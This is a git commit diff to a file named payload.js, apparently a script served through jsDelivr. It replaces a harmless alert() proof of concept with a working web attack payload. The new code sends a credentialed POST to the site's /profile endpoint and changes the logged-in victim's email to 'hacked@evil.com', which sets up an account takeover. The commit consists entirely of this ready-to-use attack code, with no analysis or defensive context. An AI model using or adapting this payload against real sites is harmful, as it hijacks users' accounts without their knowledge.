9766ae6dfd61465bd162a7d4659b587bfb10d361
Sylvialiuxi <truxxxman@gmail.com>
2026-09-17 20:40:51 +1000

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,6 @@
-   alert("payload loaded from jsDelivr");
+fetch("/profile", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "email=hacked@evil.com",
+    credentials: "include"   
+});
